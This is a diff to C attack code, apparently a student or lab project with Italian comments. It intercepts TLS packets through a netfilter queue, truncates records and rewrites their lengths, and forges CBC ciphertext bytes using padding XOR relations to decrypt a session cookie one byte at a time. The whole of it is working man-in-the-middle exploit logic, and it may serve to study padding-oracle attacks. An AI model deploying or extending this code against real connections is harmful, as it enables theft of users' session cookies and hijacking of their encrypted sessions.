@@ -279,6 +279,21 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
     //SSL/TLS data message
     if(application_payload != NULL && application_payload[0] == 0x17 && application_payload[1] == 0x03 && (application_payload[2] == 0x01 || application_payload[2] == 0x02 || application_payload[2] == 0x03)){
       printf(ANSI_COLOR_BLUE "SSL/TLS data packet detected! \n" ANSI_COLOR_RESET);
+      
+      printf("STAMPA DEI DATI PRIMA DEL TRONCAMENTO \n");
+      print_application_data(application_payload, application_payload_size);
+
+      //devo effettuare il troncamento a 85 byte
+      if(application_payload_size > data_dimension){
+        int diff = application_payload_size - data_dimension;
+        application_payload_size = data_dimension;
+        payload_len -= diff;
+        ip_header->tot_len = htons(payload_len);
+        uint16_t new_tls_len = application_payload_size - 5; 
+        application_payload[3] = (new_tls_len >> 8) & 0xFF; 
+        application_payload[4] = new_tls_len & 0xFF;
+      }
+
       if(application_payload_size > 0){
         printf("Printing of the data \n");
         print_application_data(application_payload, application_payload_size);
@@ -417,16 +432,19 @@ void modify_packet(bool first_modification){
       val_penultimate_byte = (val_penultimate_byte +1) % 0x100;
     }else{
       val_last_byte = (val_last_byte + 1) % 0x100;
-      //printf("valore del penultimo byte: %02x, valore dell'ultimo byte: %02x \n", val_penultimate_byte, val_last_byte);
     }
   }else{
-    //il valore con cui fare lo xor deve essere ottenuto dall'analisi statistica fatta suil'attacco precedente 
-    data_packet->data[5 + ((4-1) * 16 ) + 15] = cookie[cookie_index-1]; 
+    Byte original_c15 = data_packet->data[5 + ((3-1) * 16) + 15];
+    Byte known_plain = cookie[cookie_index-1];
+    Byte expected_padding = 0x01;
+
+    data_packet->data[5 + ((4-1) * 16) + 15] = original_c15 ^ known_plain ^ expected_padding;
     data_packet->data[5 + ((4-1) * 16 ) + 14] = single_byte; 
     if(single_byte == 0xFF){
       single_byte = 0x00;
+    }else{
+      single_byte = (single_byte + 1) % 0x100;
     }
-    single_byte = (single_byte + 1) % 0x100;
   }
 
   print_blocks(data_packet->data, data_packet->data_len);
@@ -660,7 +678,18 @@ void *do_attack_thread(void *arg){
         
         printf("Plaintext Penultimo: 0x%02x (ASCII: %c)\n", plain_penultimate, plain_penultimate);
         printf("Plaintext Ultimo:    0x%02x (ASCII: %c)\n", plain_last, plain_last);
+
+        /*DEBUGGING
+          so che gli ultimi 2 byte del plaintext sono 0x38 (8) e 0x39 (9)
+          per ottenere 0x01 0x01 so che i byte che devo iniettare sono
+        */
+
+        Byte expected_last_byte = 0x01 ^ 0x39 ^ original_ciph_last;
+        Byte expcted_penultime_byte = 0x01 ^ 0x038 ^ original_ciph_penultimate;
+
+        printf("I byte che l'analisi statistica deve scegliere sono: \n last_byte: %c \n penultimate_byte: %c", expected_last_byte, expcted_penultime_byte);
         
+        //stampare i valori delle mediane delle statistica
         cookie[cookie_index] = plain_last;
         cookie[cookie_index +1] = plain_penultimate;
         cookie_index+=2;
@@ -676,7 +705,7 @@ void *do_attack_thread(void *arg){
         int guessed_byte = analyze_single_byte(a_result);
         printf("guessed byte: 0x%02x \n", guessed_byte);
 
-        int plain_byte = expected_padding ^ guessed_byte ^ original_packet->data[5 + ((4-1) * 16 ) + 13];
+        int plain_byte = expected_padding ^ guessed_byte ^ original_packet->data[5 + ((4-1) * 16 ) + 14];
         printf("Plaintext byte: 0x%02x (ASCII: %c)\n", plain_byte, plain_byte);
         //aggiungere il byte in chiaro al cookie e tenerne traccia per la modifica successiva
         cookie[cookie_index] = plain_byte;
